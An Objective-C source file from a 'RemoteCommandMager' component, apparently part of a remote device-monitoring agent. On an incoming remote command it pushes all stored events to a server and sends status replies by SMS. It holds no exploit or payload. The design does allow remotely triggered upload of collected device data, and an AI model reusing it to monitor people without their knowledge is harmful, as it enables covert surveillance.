/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestEvents
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "RequestEventsProcessor.h"

@interface RequestEventsProcessor (PrivateAPI)
- (void) acknowldgeMessage;
- (void) processRequestEvents;
- (void) requestEventsException;
- (void) sendReplySMS: (NSString *) aReplyMessage isProcessCompleted:(BOOL) aIsComplete; 
- (void) processFinished;
@end

@implementation RequestEventsProcessor

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the LocationOnDemandProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"RequestEventsProcessor--->initWithRemoteCommandData")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the LocationOnDemandProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"RequestEventsProcessor--->doProcessingCommand")
	[self processRequestEvents];
}

#pragma mark RequestEventsProcessor Private Methods

/**
 - Method name: processRequestEvents
 - Purpose:This method is used to Process Request Events
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) processRequestEvents {
	DLog (@"RequestEventsProcessor--->processRequestEvents")
	id <EventDelivery> eventDelivery=[[RemoteCmdUtils sharedRemoteCmdUtils] mEventDelivery];
	BOOL isReady= [eventDelivery deliverAllEventNowWithDeliveryEventDelegate:self];
	if (!isReady) {
		[self requestEventsException];
	} else {
		[self acknowldgeMessage];
	}

}

/**
 - Method name: acknowldgeMessage
 - Purpose:		This method is used to prepare acknowldge message
 - Argument list and description:	No Argument 
 - Return description:				No Return
 */

- (void) acknowldgeMessage {
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
			
	NSString *ackMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestEventAcknowledge", @"")];
	

	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage isProcessCompleted: (BOOL) aIsComplete {
	DLog (@"RequestEventsProcessor--->sendReplySMS")
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
	
}


/**
 - Method name: processFinished
 - Purpose:This method is invoked when Activate Process is completed
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
 */

-(void) processFinished {
	DLog (@"RequestEventsProcessor--->processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

/**
 - Method name: requestEventsException
 - Purpose:This method is invoked when  processRequestEvents failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
 */

- (void) requestEventsException {
	DLog (@"RequestEventsProcessor--->requestEventsException")
	FxException* exception = [FxException exceptionWithName:@"requestEventsException" andReason:@"Request Events error"];
	[exception setErrorCode:kEventDeliveryManagerBusy];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}


#pragma mark EventDeliveryManager Methods

/**
 - Method name: eventDidDelivered:withStatusCode:andStatusMessage
 - Purpose:This method is invoked when event is delivered
 - Argument list and description:aSuccess(Bool), aStatusCode (NSUInteger),aMessage (NSString)
 - Return description: No return type
 */

- (void) eventDidDelivered: (BOOL) aSuccess 
			withStatusCode: (NSInteger) aStatusCode 
		  andStatusMessage: (NSString*) aMessage {
	DLog (@"RequestEventsProcessor--->eventDidDelivered")
	NSString *messageFormat =nil;
	NSString *requestEventMessage=nil;
	if  (aSuccess) { 
		messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																				  andErrorCode:_SUCCESS_];
		requestEventMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kRequestEvent", @"")];
	}
	else {
		requestEventMessage=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																				  andErrorCode:aStatusCode];
	}		
	[self sendReplySMS:requestEventMessage isProcessCompleted:YES];
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[super dealloc];
}

@end
